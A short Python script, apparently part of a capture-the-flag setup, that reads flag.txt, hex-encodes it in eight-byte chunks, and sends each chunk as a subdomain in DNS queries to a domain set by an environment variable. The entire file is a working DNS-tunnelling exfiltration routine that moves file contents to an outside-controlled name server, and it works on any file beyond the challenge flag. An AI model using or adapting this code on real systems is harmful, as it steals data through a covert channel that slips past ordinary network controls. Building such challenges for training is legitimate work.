import dns.resolver
import os

DOCKER = os.environ.get('DOCKER')
DOMAIN = os.environ.get('DOMAIN')
DATA = open('flag.txt', 'r').read()
custom_resolver = dns.resolver.Resolver()
custom_resolver.nameservers = [dns.resolver.resolve(DOCKER, 'A', lifetime=1000)[0].to_text()]

while True:
    try:
        test = custom_resolver.resolve(DOMAIN, lifetime=1000)
        for _ in range(0, len(DATA), 8):
            request = custom_resolver.resolve(f"{DATA[_:_+8].encode().hex()}.{DOMAIN}")
            print(f"{DATA[_:_+8].encode().hex()}.{DOMAIN}")
        break
    except dns.resolver.NXDOMAIN:
        print('ip not found.') 
    
print("DONE")